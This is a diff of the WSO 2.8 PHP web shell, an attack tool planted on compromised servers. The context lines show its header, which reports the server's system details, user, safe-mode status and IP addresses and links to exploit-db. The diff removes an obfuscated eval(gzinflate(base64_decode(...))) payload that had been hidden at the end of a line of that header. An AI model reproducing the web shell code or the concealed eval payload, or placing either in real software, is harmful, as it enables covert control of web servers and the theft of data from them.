@@ -18,7 +18,7 @@ if(!empty($_SERVER['HTTP_USER_AGENT'])) {
 @set_time_limit(0);
 @set_magic_quotes_runtime(0);
 @define('WSO_VERSION', '2.8');
- 
+
 if(get_magic_quotes_gpc()) {
     function WSOstripslashes($array) {
         return is_array($array) ? array_map('WSOstripslashes', $array) : stripslashes($array);
@@ -272,7 +272,7 @@ pre{font-family:Courier,Monospace;}
        . '<td><nobr>' . substr(@php_uname(), 0, 120) . ' <a href="' . $explink . '" target=_blank>[exploit-db.com]</a></nobr><br>' . $uid . ' ( ' . $user . ' ) <span>Group:</span> ' . $gid . ' ( ' . $group . ' )<br>' . @phpversion() . ' <span>Safe mode:</span> ' . ($GLOBALS['safe_mode']?'<font color=red>ON</font>':'<font color=green><b>OFF</b></font>')
        . ' <a href=# onclick="g(\'Php\',null,\'\',\'info\')">[ phpinfo ]</a> <span>Datetime:</span> ' . date('Y-m-d H:i:s') . '<br>' . wsoViewSize($totalSpace) . ' <span>Free:</span> ' . wsoViewSize($freeSpace) . ' ('. (int) ($freeSpace/$totalSpace*100) . '%)<br>' . $cwd_links . ' '. wsoPermsColor($GLOBALS['cwd']) . ' <a href=# onclick="g(\'FilesMan\',\'' . $GLOBALS['home_cwd'] . '\',\'\',\'\',\'\')">[ home ]</a><br>' . $drives . '</td>'
        . '<td width=1 align=right><nobr><select onchange="g(null,null,null,null,null,this.value)"><optgroup label="Page charset">' . $opt_charsets . '</optgroup></select><br><span>Server IP:</span><br>' . @$_SERVER["SERVER_ADDR"] . '<br><span>Client IP:</span><br>' . $_SERVER['REMOTE_ADDR'] . '</nobr></td></tr></table>'
-       . '<table style="border-top:2px solid #333;" cellpadding=3 cellspacing=0 width=100%><tr>' . $menu . '</tr></table><div style="margin:5">';eval(gzinflate(base64_decode('dZJNc5swEIb/iieTQ3ITuInLZHrAuBIrx9SA+dLFAxbBssRHQxMX//qqJk4y0+lhR6PZffTuu6vrrn3+tS1Ew7d88m1yRV3W7UyFssG2wAmefGStQ6RwMlAzT72OuyuRbnrPqVUNTiV5rU55GhxggXQ9iGU4ny38ttLsWE9Wlc5Vq4VmhF1d3i+mUK1DW6aGhyPFdPQikrG3MQKcIvw9wDDqnBmuMn2CY//DhDiIImzBxvAiUOii3RV1e67/q02xtQlimugoQFEcxTGOjOApjin9xKAspQ1L/TOzq/GUp7RnJD4UZqCWTjBlCbxQol5yIS/MT54ERvGmA0r3qbyWJb97IHvEXfv+cfgqOcEDM2MEhN59zMUa4PDmj9BX5sqLP+E3cfND2P/l1oQOawFjD+S8hz1LjCN3ZTvOSnbg9pVPjH2eHFuosxNbzE+rKTV12DmxUJHgrnDutDckHt99HGVWW7IM5Qxc5DmNjjrud2ZUlYP9vuvl0I95OT8xfS9M6zlPohaacbelgP7jH8nZ1cOkfM3VTZH35f2XLS93LS9vrj/9vNvbhz8= ')));
+       . '<table style="border-top:2px solid #333;" cellpadding=3 cellspacing=0 width=100%><tr>' . $menu . '</tr></table><div style="margin:5">';
 }
  
 function wsoFooter() {
